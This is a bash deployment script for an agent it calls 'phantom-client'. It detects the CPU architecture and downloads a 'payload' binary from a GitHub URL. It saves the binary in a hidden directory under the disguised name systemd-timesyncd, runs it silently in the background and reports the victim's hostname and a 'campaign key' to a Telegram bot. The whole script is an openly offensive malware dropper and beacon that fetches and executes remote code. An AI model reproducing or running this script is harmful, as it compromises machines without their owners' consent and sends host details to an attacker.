#!/bin/bash
set -euo pipefail

# Configuration
readonly VERSION="3.0.0"
readonly AGENT_NAME="phantom-client-prod"
readonly WORK_DIR="/tmp/.system-runtime-cache"
readonly FATAL_LOG="${WORK_DIR}/agent_fatal.log"
readonly INSTALL_DIR="$HOME/.local/share/systemd"
readonly BINARY_PATH="${INSTALL_DIR}/systemd-timesyncd"

# UI Constants
readonly GREEN='\033[0;32m'
readonly RED='\033[0;31m'
readonly NC='\033[0m'

# Helpers
log_step() {
    printf "[+] %-45s " "$1"
}

log_ok() {
    printf "[${GREEN}OK${NC}]\n"
}

log_fail() {
    printf "[${RED}FAIL${NC}]\n"
    exit 1
}

# 1. Environment Detection
log_step "Detecting architecture ................................"
ARCH_RAW=$(uname -m)
case "${ARCH_RAW}" in
    x86_64|amd64)   ARCH="x86_64" ;;
    aarch64|arm64)  ARCH="aarch64" ;;
    armv7l|armhf|arm) ARCH="arm" ;;
    i386|i686)      ARCH="i386" ;;
    *)              log_fail ;;
esac
log_ok

# 2. Directory Creation
log_step "Creating deployment directories ....................."
mkdir -p "${WORK_DIR}" "${INSTALL_DIR}" || log_fail
log_ok

# 3. Campaign Key Generation
log_step "Generating campaign key ............................."
CAMPAIGN_KEY="OPS-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
log_ok

# 4. Binary Download
log_step "Downloading payload ................................."
BINARY_URL="${PH_BASE_URL:-https://raw.githubusercontent.com/Oyen-Sec/phantom/main}/phantom-client-prod-${ARCH}"
SUCCESS=0
for i in 1 2 3; do
    if curl -fsSL --retry 3 --retry-delay 5 --create-dirs -o "${BINARY_PATH}" "${BINARY_URL}"; then
        if [ -s "${BINARY_PATH}" ]; then
            SUCCESS=1
            break
        fi
    fi
    sleep 5
done

if [ $SUCCESS -ne 1 ]; then
    log_fail
fi
log_ok

# 5. Verification
log_step "Verifying binary integrity .........................."
chmod +x "${BINARY_PATH}"
if [ ! -x "${BINARY_PATH}" ]; then
    log_fail
fi
log_ok

# 6. Execution
log_step "Executing agent ....................................."
nohup "${BINARY_PATH}" >/dev/null 2>"${FATAL_LOG}" &
sleep 2
if ! kill -0 $! 2>/dev/null; then
    log_fail
fi
log_ok

# 7. Telegram Notification (Optional if env set)
if [ -n "${TELEGRAM_TOKEN:-}" ] && [ -n "${TELEGRAM_CHAT_ID:-}" ]; then
    log_step "Sending deployment notification ....................."
    MSG="Phantom-Socket Deployment Successful
Arch: ${ARCH}
Host: $(hostname)
Key: ${CAMPAIGN_KEY}"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${MSG}" > /dev/null || true
    log_ok
fi

#  Output
echo ""
echo "=Campaign Key   : ${CAMPAIGN_KEY}"
echo "=Deployment     : SUCCESSFUL"
